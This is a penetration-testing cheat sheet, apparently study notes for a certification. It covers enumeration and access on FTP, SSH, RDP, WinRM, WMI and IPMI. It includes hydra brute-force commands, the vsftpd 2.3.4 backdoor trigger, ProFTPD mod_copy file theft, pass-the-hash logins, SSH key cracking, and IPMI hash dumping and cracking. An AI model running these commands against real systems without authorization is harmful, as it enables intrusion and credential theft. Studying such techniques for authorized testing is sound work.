---
title: "Remote Access Services — FTP, SSH, RDP, WinRM"
description: "Enumeration and access techniques for file transfer and remote shell services."
category: "Field Manual"
tags: ["field-manual", "cpts", "ftp", "ssh", "rdp", "winrm"]
date: 2026-11-11
published: true
status: archive
---

# Remote Access Services

## FTP (21)

### Cheatsheet

```bash
nmap -p21 -sV --script ftp-anon,ftp-bounce,ftp-syst $IP
ftp $IP                      # anonymous / blank password
lftp -u $USER,$PASS $IP
wget -m --no-passive ftp://anonymous:anonymous@$IP/
hydra -L users.txt -P passwords.txt ftp://$IP
```

### TLS and interactive inspection

| Command | Description |
|---|---|
| `telnet <FQDN/IP> 21` | Open a raw FTP control-channel session. |
| `openssl s_client -connect <FQDN/IP>:21 -starttls ftp` | Negotiate explicit FTPS and inspect the certificate and greeting. |

At the `ftp>` prompt:

| Command | Description |
|---|---|
| `ls` | List the current remote directory. |
| `status` | Show the client's connection state, transfer type, and active/passive settings. |
| `debug` | Toggle debugging to display commands exchanged with the server. |
| `trace` | Toggle packet tracing in clients that support it. |
| `ls -R` | Recursively list directories if the server permits it. |
| `get Important\ Notes.txt` | Download a file whose name contains a space. |
| `exit` | Close the FTP session. |

FTP control uses TCP 21. Active-mode data connections normally originate from server port 20; passive mode uses a server-advertised port. A successful login followed by a stalled listing often indicates a data-channel problem. FTPS certificate subjects can reveal internal hostnames and organization details.

### Methodology

- [ ] Try `anonymous:anonymous` and blank passwords.
- [ ] List recursively; download everything (`wget -m`, `lftp mirror`).
- [ ] Check write permissions in every directory (`put test.txt`).
- [ ] Check whether the FTP root maps to a web root (upload a test file, request it over HTTP).
- [ ] Read banners/configs for other services and credentials.
- [ ] Check known backdoors if the version is old (vsftpd 2.3.4, ProFTPD mod_copy).

### Notes

FTP is cleartext. Captured traffic may contain credentials. `ftp-syst` reveals the server OS; `ftp-bounce` can sometimes reach internal hosts.

vsftpd 2.3.4 backdoor: connect, send `USER x:)`, then a shell opens on port 6200. Only relevant to that exact version.

ProFTPD `mod_copy`: if enabled, copy files server-side without auth:

```bash
nc $IP 21
SITE CPFR /etc/passwd
SITE CPTO /var/www/html/passwd.txt
```

### vsftpd configuration clues

With local file access on the FTP server:

| Command | Description |
|---|---|
| `cat /etc/vsftpd.conf \| grep -v '#'` | Inspect explicitly configured vsftpd settings. |
| `cat /etc/ftpusers` | Read the list of accounts denied FTP access. |

| Setting | Enumeration implication |
|---|---|
| `anonymous_enable=YES` | Anonymous authentication is enabled. |
| `no_anon_password=YES` | Anonymous users need not supply a password. |
| `anon_root=/home/username/ftp` | Locates the anonymous FTP root. |
| `anon_upload_enable=YES` | Anonymous uploads may be allowed, subject to filesystem permissions. |
| `anon_mkdir_write_enable=YES` | Anonymous users may create directories. |
| `write_enable=YES` | Enables write-related FTP commands; per-user and filesystem restrictions still apply. |
| `local_enable=YES` | Local system accounts may authenticate. |
| `chown_uploads=YES`, `chown_username=username` | Uploaded files may be reassigned to a different owner. |
| `hide_ids=YES` | Listings display `ftp` instead of real user/group ownership. |
| `ls_recurse_enable=YES` | Recursive listings are permitted. |
| `chroot_local_user=YES` | Local users are generally confined to their home directories; inspect chroot-list exceptions. |
| `ssl_enable=NO` | TLS support is disabled in this configuration. |

## SSH (22)

### Cheatsheet

```bash
nmap -p22 -sV --script ssh2-enum-algos,ssh-hostkey,ssh-auth-methods $IP
ssh-audit $IP
ssh $USER@$IP
ssh -i id_rsa $USER@$IP
hydra -L users.txt -P passwords.txt ssh://$IP
```

| Command | Description |
|---|---|
| `ssh -v "$USER@$IP"` | Show negotiation details and the authentication methods the server offers. |
| `ssh -v "$USER@$IP" -o PreferredAuthentications=password` | Select password authentication explicitly instead of offering keys first. |
| `cat /etc/ssh/sshd_config \| grep -v '#' \| sed -r '/^\s*$/d'` | Inspect the server's active, non-comment configuration with local file access. |

The standalone source-checkout entry point for `ssh-audit` is `./ssh-audit.py`. Follow `Include` directives such as `/etc/ssh/sshd_config.d/*.conf` when reviewing server configuration.

| Setting | Enumeration implication |
|---|---|
| `PasswordAuthentication yes` | Password authentication is offered. |
| `PermitEmptyPasswords yes` | Empty-password accounts may authenticate when other authentication rules permit it. |
| `PermitRootLogin yes` | Direct root login is allowed by this policy. |
| `Protocol 1` | Historical SSHv1 configuration; relevant only to old implementations. |
| `X11Forwarding yes` | X11 forwarding is available. |
| `AllowTcpForwarding yes` | TCP forwarding is available, subject to additional restrictions. |
| `PermitTunnel yes` | Tunnel-device forwarding is allowed. |
| `DebianBanner yes` | The banner can disclose distribution-specific version information. |

### Methodology

- [ ] Banner and supported algorithms (`ssh-audit`).
- [ ] Password authentication enabled? Public key only?
- [ ] Valid usernames from other services (AD, web, mail).
- [ ] Found private keys: check permissions, passphrase, and `authorized_keys` targets.
- [ ] Reused credentials from other services.
- [ ] Once in: keys, agent forwarding, sudo, internal ports, `~/.ssh/config`.

### Key handling

```bash
chmod 600 id_rsa
ssh-keygen -y -f id_rsa                 # derive public key; prompts if encrypted
ssh2john id_rsa > id_rsa.hash
john --wordlist=rockyou.txt id_rsa.hash
```

If you can write `~/.ssh/authorized_keys`, append your public key and log in. If `authorized_keys` is writable by another user, that is privilege escalation.

### Pivoting with SSH

```bash
ssh -L 8080:127.0.0.1:80 $USER@$IP          # local forward
ssh -R 4444:127.0.0.1:4444 $USER@$IP        # remote forward
ssh -D 1080 $USER@$IP                       # SOCKS proxy
ssh -J jump@$IP internal@10.10.10.20        # jump host
```

### Pitfalls

- Host key warnings after a rebuild: use `-o StrictHostKeyChecking=no` only in labs.
- `Permission denied (publickey)` may still allow a different user.
- Fail2ban can block you; slow down or use keys.

## RDP (3389)

### Cheatsheet

```bash
nmap -p3389 --script rdp-enum-encryption,rdp-ntlm-info $IP
nxc rdp $IP -u $USER -p $PASS
xfreerdp /v:$IP /u:$USER /p:$PASS /cert:ignore /dynamic-resolution +clipboard
xfreerdp /v:$IP /u:$USER /pth:$NTHASH /cert:ignore
```

| Command | Description |
|---|---|
| `./rdp-sec-check.pl <FQDN/IP>` | Inspect supported RDP security layers and encryption settings without credentials. |
| `nmap -sV -sC 10.10.10.20 -p3389 --packet-trace --disable-arp-ping -n` | Inspect the RDP handshake and discovery traffic. |

`rdp-sec-check.pl` requires the Perl `Encoding::BER` module. `HYBRID_REQUIRED_BY_SERVER` indicates that CredSSP/NLA is required. Nmap's RDP handshake may contain the recognizable `mstshash=nmap` cookie.

### Methodology

- [ ] NLA enabled? `rdp-ntlm-info` leaks domain, hostname, OS build.
- [ ] Valid domain/local accounts from enumeration.
- [ ] Password reuse; try local accounts with `--local-auth` in NetExec.
- [ ] Pass-the-hash if NLA is not enforcing full logon restrictions.
- [ ] Check for BlueKeep (CVE-2019-0708) only on legacy Windows; use a safe checker, never exploit blindly.
- [ ] Once in: disable clipboard redirection if policy forbids it; check mapped drives.

### Notes

RDP gives a full desktop, which is useful for GUI-only tools (BloodHound, RSAT, browsers). It is also noisy and slow over a pivot. Prefer WinRM/PowerShell when available.

`xfreerdp /dynamic-resolution +clipboard /drive:share,/tmp` maps a local directory into the session.

## WinRM (5985/5986)

### Cheatsheet

```bash
nxc winrm $IP -u $USER -p $PASS
evil-winrm -i $IP -u $USER -p $PASS
evil-winrm -i $IP -u $USER -H $NTHASH
```

```powershell
Test-WSMan -ComputerName $IP
Enter-PSSession -ComputerName $IP -Credential (Get-Credential)
```

### Listener discovery and WinRS

| Command | Description |
|---|---|
| `nmap -sV -sC 10.10.10.20 -p5985,5986 --disable-arp-ping -n` | Identify WinRM HTTP and HTTPS listeners. |
| `evil-winrm -S -i <FQDN/IP> -u <user> -p '<password>'` | Connect through the HTTPS listener. |

From Windows, WinRS runs a command over the same WS-Management transport:

```cmd
winrs -r:http://10.10.10.20:5985 -u:TARGET\user -p:"<password>" hostname
```

An HTTPAPI `404 Not Found` at `/` can coexist with a functioning WinRM endpoint. Use the native WS-Management check above to confirm the service.

### Methodology

- [ ] Test with domain and local accounts (`-u Administrator` vs `-u HOST\\Administrator`).
- [ ] Check group membership: `Remote Management Users` or local Administrators.
- [ ] Pass-the-hash works with WinRM when the account is authorised.
- [ ] Evil-WinRM features: `upload`, `download`, `menu`, `Bypass-4MSI`, `Invoke-Binary`, `Dll-Loader`.
- [ ] Logs: WinRM creates event log entries; note this for reporting.

### Pitfalls

- 5985 is HTTP; 5986 is HTTPS with a certificate. `evil-winrm -S` for SSL.
- `Access is denied` often means valid credentials but insufficient group membership, not a bad password.
- Kerberos auth may need `-r` (realm) and a valid ticket.

## References

- [HackTricks — FTP](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ftp/index.html)
- [HackTricks — SSH](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ssh.html)
- [HackTricks — RDP](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-rdp.html)
- [HackTricks — WinRM](https://book.hacktricks.wiki/en/network-services-pentesting/5985-5986-pentesting-winrm.html)
- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)

## WMI / DCOM (135 + dynamic RPC)

WMI initializes through the RPC endpoint mapper on TCP 135 and then uses negotiated RPC ports. Impacket's `wmiexec.py` also uses SMB for its usual command-output retrieval.

| Command | Description |
|---|---|
| `wmiexec.py '<user>:<password>@<FQDN/IP>' 'hostname'` | Execute a command through WMI with explicit credentials. |

Some distributions install this entry point as `impacket-wmiexec`; domain credentials use the `DOMAIN/user:password@host` form.

## IPMI (623 UDP)

BMCs such as iLO, iDRAC, and Supermicro IPMI operate independently of the host OS. Their web, SSH, or Telnet interfaces may remain reachable even when the host itself is powered down.

| Command | Description |
|---|---|
| `sudo nmap -sU --script ipmi-version -p623 <FQDN/IP>` | Identify the IPMI version and advertised authentication capabilities. |
| `msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_version; set RHOSTS 10.10.10.20; show options; run; exit'` | Run Metasploit's IPMI information-discovery module. |
| `msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS 10.10.10.20; set OUTPUT_HASHCAT_FILE ipmi.txt; run; exit'` | Save RAKP authentication material for offline password testing. |
| `hashcat -m 7300 ipmi.txt -a 0 /usr/share/wordlists/rockyou.txt` | Test a wordlist against captured IPMI2 RAKP HMAC-SHA1 material. |
| `hashcat -m 7300 ipmi.txt -a 3 '?1?1?1?1?1?1?1?1' -1 '?d?u'` | Test the eight-character uppercase/digit mask used by some older iLO factory passwords. |

RAKP responses require a valid BMC username but can be obtained before successful password authentication. The eight-character mask has `36^8` candidates; it is a format-specific example rather than a short password check. See [[pending/field-manual/01-information-gathering/service-enumeration/network-management#IPMI (623 UDP)|IPMI management commands]] for inventory and console access.
